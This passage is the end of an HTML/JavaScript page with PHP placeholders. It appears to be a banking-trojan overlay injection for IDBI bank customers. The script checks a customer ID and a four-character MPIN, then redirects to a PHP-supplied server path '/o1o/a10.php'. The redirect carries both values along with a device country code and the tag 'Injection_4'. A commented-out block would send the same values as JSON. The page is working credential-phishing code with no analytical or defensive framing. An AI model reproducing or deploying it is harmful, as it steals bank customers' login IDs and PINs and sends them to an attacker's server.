							oNumInp.className = oCodeInp.className = 'input-field';
						} catch(e){};

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{4,4}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						top['closeDlg'] = true;
						/*prompt('send', '{"dialog id" : "idbi'+
						'", "customer_id": "'+oNumInp.value+
						'", "mpin": "'+oCodeInp.value+'"}');

						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/

						var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|idbi|"+oNumInp.value+"|"+oCodeInp.value+"|");

						return false;
                    };

                })();
            </script>

</body>
</html>
